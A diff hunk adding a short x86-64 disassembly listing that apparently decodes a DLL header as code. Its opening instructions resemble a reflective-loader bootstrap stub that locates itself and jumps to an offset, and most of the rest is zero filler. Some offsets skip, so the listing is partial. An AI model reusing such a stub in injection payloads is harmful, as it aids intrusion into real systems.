@@ -1,0 +1,32 @@
+0: pop r10
+2: or al, 0xd1
+4: cli 
+5: call 0xa
+10: pop rbx
+11: push rdx
+12: push r13
+14: mov ebp, esp
+16: add ebx, 0x4990
+22: call rbx
+24: add ebx, 0x26869
+30: push rbx
+31: push 4
+33: push rax
+34: call rax
+36: add byte ptr [rax], al
+38: add byte ptr [rax], al
+40: add byte ptr [rax], al
+42: add byte ptr [rax], al
+44: add byte ptr [rax], al
+46: je 0xffffffffffffffbe
+48: shr dword ptr [rdx], 0x4c
+51: jo 0x61
+53: add byte ptr [rax], al
+56: add byte ptr [rax], al
+58: add byte ptr [rax], al
+60: add byte ptr [rax], al
+62: xor byte ptr [rax], ah
+68: add byte ptr [rax], al
+70: add byte ptr [rax], al
+72: add byte ptr [rax], al
+74: add dword ptr [rax], eax
